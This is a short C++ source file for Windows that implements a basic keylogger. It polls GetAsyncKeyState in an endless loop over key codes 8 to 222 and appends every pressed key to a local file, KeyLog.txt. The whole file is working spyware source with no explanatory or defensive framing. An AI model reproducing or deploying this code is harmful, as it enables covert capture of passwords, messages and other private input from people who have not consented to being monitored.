#include <iostream>
#include <Windows.h>
#include <Winuser.h>
#include <fstream>

using namespace std;

int main() {
    char c;

    for (;;) {
        for (c = 8; c <= 222; c++) {
            if (GetAsyncKeyState(c) == -32767) {
                ofstream write ("../Text/KeyLog.txt", ios::app);
                write << c;
            }
        }
    }
}